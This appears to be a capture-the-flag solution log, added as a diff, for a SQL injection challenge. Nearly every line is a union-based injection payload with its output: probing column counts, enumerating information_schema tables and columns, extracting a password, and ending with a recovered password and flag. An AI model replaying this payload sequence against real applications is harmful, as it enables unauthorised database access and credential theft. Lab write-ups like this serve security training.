@@ -1,0 +1,21 @@
+' OR 1=1 LIMIT 1,1 -- ' => "Now we're e-mailing and tweeting and texting so much, a phone call comes as a fresh surprise. I get text messages on my cell phone all day long, and it warbles to alert me that someone has sent me a message on Facebook or a reply or direct message on Twitter, but it rarely ever rings."
+user1 ' order by 3 LIMIT 1 -- ' => "Now we're e-mailing and tweeting and texting so much, a phone call comes as a fresh surprise. I get text messages on my cell phone all day long, and it warbles to alert me that someone has sent me a message on Facebook or a reply or direct message on Twitter, but it rarely ever rings."
+user1 ' UNION select null as one, null as two, null as three LIMIT 1 -- ' => "Now we're e-mailing and tweeting and texting so much, a phone call comes as a fresh surprise. I get text messages on my cell phone all day long, and it warbles to alert me that someone has sent me a message on Facebook or a reply or direct message on Twitter, but it rarely ever rings."
+
+user1 ' UNION SELECT null as one, null as two, null as three from information_schema.tables LIMIT 1 -- ' => "Now we're e-mailing and tweeting and texting so much, a phone call comes as a fresh surprise. I get text messages on my cell phone all day long, and it warbles to alert me that someone has sent me a message on Facebook or a reply or direct message on Twitter, but it rarely ever rings."
+
+user1 ' UNION SELECT "one" as one, "two" as two, "three" as three from information_schema.tables order by user LIMIT 1 -- ' => three
+user1 ' UNION SELECT "one" as one, "two" as two, table_name as three from information_schema.tables order by user LIMIT 1 -- ' => CHARACTER_SETS
+user1 ' UNION SELECT "one" as one, "two" as two, table_name as three from information_schema.tables order by user LIMIT 65,1 -- ' => quotes
+user1 ' UNION SELECT "one" as one, "two" as two, table_name as three from information_schema.tables order by user LIMIT 66,1 -- ' => s'identifier
+
+user1 ' UNION SELECT "one" as one, "two" as two, column_name as three from information_schema.columns where table_name = "s'identifier" LIMIT 1,1 -- ' => nombre_de_usario
+user1 ' UNION SELECT "one" as one, "two" as two, column_name as three from information_schema.columns where table_name = "s'identifier" LIMIT 2,1 -- ' => kupuhipa (password)
+
+user1 ' UNION SELECT "one" as one, "two" as two, "three" as three from
+`s'identifier` LIMIT 1,1 -- '
+user1 ' UNION SELECT "one" as one, "two" as two, kupuhipa as three from
+`s'identifier` LIMIT 1,1 -- '  => Lg6xgFmk9RPd
+
+So the password is Lg6xgFmk9RPd
+and the flag is {pl41n77357_b35773x7}
